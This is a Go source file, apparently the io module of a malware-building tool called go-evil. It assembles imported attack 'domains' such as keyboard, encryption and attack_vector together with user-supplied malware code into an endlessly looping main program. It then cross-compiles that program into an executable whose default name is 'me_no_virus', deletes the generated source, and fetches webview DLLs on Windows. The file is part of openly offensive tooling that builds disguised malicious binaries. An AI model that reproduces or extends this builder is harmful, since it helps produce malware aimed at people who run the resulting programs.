package io

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"

	mal "github.com/s9rA16Bf4/go-evil/domains/malware"
	"github.com/s9rA16Bf4/go-evil/utility/notify"
)

var debug bool = false
var domains []string

func Set_debug(new_debug bool) {
	debug = new_debug
}

const (
	sys           = "\tsys \"github.com/s9rA16Bf4/go-evil/domains/system\""
	win           = "\twin \"github.com/s9rA16Bf4/go-evil/domains/window\""
	time          = "\ttime \"github.com/s9rA16Bf4/go-evil/domains/time\""
	keyboard      = "\tkeyboard \"github.com/s9rA16Bf4/go-evil/domains/keyboard\""
	hashing       = "\thash \"github.com/s9rA16Bf4/go-evil/domains/algorithm/hashing\""
	encryption    = "\tenc \"github.com/s9rA16Bf4/go-evil/domains/algorithm/encryption\""
	attack_vector = "\tattack \"github.com/s9rA16Bf4/go-evil/domains/attack_vector\""

	// Related to webview
	loader_x86 = "https://github.com/webview/webview/raw/master/dll/x86/WebView2Loader.dll"
	view_x86   = "https://github.com/webview/webview/raw/master/dll/x86/webview.dll"
	loader_x64 = "https://github.com/webview/webview/raw/master/dll/x64/WebView2Loader.dll"
	view_x64   = "https://github.com/webview/webview/raw/master/dll/x64/webview.dll"
)

func Append_domain(domain string) {
	switch domain {
	case "system":
		if !find(sys) {
			domains = append(domains, sys)
		}
	case "window":
		if !find(win) {
			domains = append(domains, win)
		}
	case "time":
		if !find(time) {
			domains = append(domains, time)
		}

	case "keyboard":
		if !find(keyboard) {
			domains = append(domains, keyboard)
		}
	case "hashing":
		if !find(hashing) {
			domains = append(domains, hashing)
		}
	case "encryption":
		if !find(encryption) {
			domains = append(domains, encryption)
		}
	case "attack_vector":
		if !find(attack_vector) {
			domains = append(domains, attack_vector)
		}
	}
}

func Set_target_OS(new_os string) {
	os.Setenv("GOOS", new_os)

}
func Set_target_ARCH(new_arch string) {
	os.Setenv("GOARCH", new_arch)
}

func find(domain string) bool {
	for _, line := range domains {
		if domain == line {
			return true
		}
	}
	return false
}

func Write_file() {
	base_code := []string{
		"package main",
		"import (",
	}
	base_code = append(base_code, domains...)                  // Which domains to include
	base_code = append(base_code, ")", "func main(){")         // Main function and closing include tag
	base_code = append(base_code, "for {")                     // While loop
	base_code = append(base_code, mal.Malware_getContent()...) // Insert the malware code
	base_code = append(base_code, "}}")                        // And insert the end

	if mal.Malware_getName() == "" {
		mal.Malware_setBinaryName("me_no_virus")
	}

	file, _ := os.Create("output/temp.go") // We utilize a temp directory
	write := bufio.NewWriter(file)

	for _, line := range base_code {
		_, err := write.WriteString(line + "\n")
		if err != nil {
			notify.Notify_error("Failed to write to disk", "io.write_file()")
		}
	}
	write.Flush()
}

func Read_file(file string) string {
	file_gut, err := ioutil.ReadFile(file)
	if err != nil {
		notify.Notify_error(err.Error(), "io.read_file()")
	}
	return string(file_gut)
}

func Compile_file() {
	if runtime.GOOS == "windows" && mal.Malware_getExtension() == "" {
		mal.Malware_setExtension(".exe") // Apparently golang on windows doesn't do this automatically
	}
	arg := "build -o output/" + mal.Malware_getName() + mal.Malware_getExtension() + " output/temp.go"
	cmd := exec.Command("go", strings.Split(arg, " ")...)

	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr

	err := cmd.Run()

	if err != nil {
		notify.Notify_error(fmt.Sprint(err)+": "+stderr.String(), "io.compile_file()")
	}

	if !debug {
		arg = "output/temp.go"
		cmd = exec.Command("rm", strings.Split(arg, " ")...)
		err := cmd.Run()

		if err != nil {
			notify.Notify_error(fmt.Sprint(err)+": "+stderr.String(), "io.compile_file()")
		}
	}

	create_dll() // Creates only if necessary to the somewhat required dll files
}

func create_dll() {
	if runtime.GOOS == "windows" { // Only required on windows, seems like most posix systems has this already included
		_, err := os.Stat("output/WebView2Loader.dll")
		if err != nil {
			create_WebView2Loader()
		}
		_, err = os.Stat("output/webview.dll")
		if err != nil {
			create_webView()
		}
	}
}
func create_webView() {
	target := ""
	if os.Getenv("GOARCH") == "x64" {
		target = view_x64
	} else {
		target = view_x86
	}
	response, err := http.Get(target)
	if err != nil {
		notify.Notify_error(err.Error(), "io.create_webView()")
	}
	out, err := os.Create("output/webView.dll")
	if err != nil {
		notify.Notify_error(err.Error(), "io.create_webView()")
	}

	_, err = io.Copy(out, response.Body)
	if err != nil {
		notify.Notify_error(err.Error(), "io.create_webView()")
	}
}
func create_WebView2Loader() {
	target := ""
	if os.Getenv("GOARCH") == "x64" {
		target = loader_x64
	} else {
		target = loader_x86
	}
	response, err := http.Get(target)
	if err != nil {
		notify.Notify_error(err.Error(), "io.create_WebView2Loader()")
	}
	out, err := os.Create("output/WebView2Loader.dll")
	if err != nil {
		notify.Notify_error(err.Error(), "io.create_WebView2Loader()")
	}

	_, err = io.Copy(out, response.Body)
	if err != nil {
		notify.Notify_error(err.Error(), "io.create_WebView2Loader()")
	}
}
